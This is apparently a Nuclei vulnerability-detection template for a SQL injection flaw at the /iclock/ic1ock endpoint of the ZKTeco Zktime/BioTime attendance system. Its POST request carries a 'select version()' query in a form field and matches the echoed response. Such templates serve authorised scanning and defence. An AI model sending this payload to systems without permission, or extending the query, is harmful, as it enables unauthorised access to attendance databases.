id: zkteco-biotime-ic1ock-sqli

info:
  name: Zktime考勤管理系统iclock存在SQL注入
  author: onewin
  severity: high
  description: |
    Zktime考勤管理系统iclock存在SQL注入漏洞，攻击者可通过/iclock/ic1ock接口执行任意SQL语句
  tags: ZKTECO-时间精细化管理平台

http:
  - method: POST
    path: 
      - "{{BaseURL}}/iclock/ic1ock"
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
      Content-Type: application/x-www-form-urlencoded
    body: "submit=%E6%89%A7%E8%A1%8C+SQL+%E8%AF%AD%E5%8F%A5&sql=select+version()"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "执行 SQL 语句"
          - "version()"
        condition: and